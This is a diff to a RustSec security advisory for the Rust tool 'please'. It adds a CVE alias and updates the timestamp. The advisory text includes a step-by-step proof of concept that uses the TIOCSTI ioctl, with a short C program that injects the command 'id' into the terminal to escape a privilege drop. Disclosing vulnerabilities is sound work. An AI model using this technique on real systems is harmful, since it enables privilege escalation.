@@ -1,8 +1,10 @@
 {
   "id": "RUSTSEC-2023-0066",
-  "modified": "2023-10-03T13:53:18Z",
+  "modified": "2023-10-28T16:16:37Z",
   "published": "2023-04-29T12:00:00Z",
-  "aliases": [],
+  "aliases": [
+    "CVE-2023-46277"
+  ],
   "related": [],
   "summary": "Vulnerable to privilege escalation using ioctls TIOCSTI and TIOCLINUX",
   "details": "please is vulnerable to privilege escalation using ioctls TIOCSTI\nand TIOCLINUX on systems where they are not disabled.\n\nHere is how to see it in action:\n\n```\n$ cd \"$(mktemp -d)\"\n$ git clone --depth 1 https://gitlab.com/edneville/please.git\n$ cd please/\n$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9\n$ cargo test && cargo build --release\n$ echo \"[${USER}_as_nobody]\"$'\\nname='\"${USER}\"$'\\ntarget=nobody\\nrule=.*\\nrequire_pass=false' | sudo tee /etc/please.ini\n$ sudo chown root:root ./target/release/please\n$ sudo chmod u+s ./target/release/please\n$ cat <<TIOCSTI_C_EOF | tee TIOCSTI.c\n#include <sys/ioctl.h>\n\nint main(void) {\n  const char *text = \"id\\n\";\n  while (*text)\n    ioctl(0, TIOCSTI, text++);\n  return 0;\n}\nTIOCSTI_C_EOF\n$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c\n$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody\n```\n\nPlease note that:\n\nThis affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.",
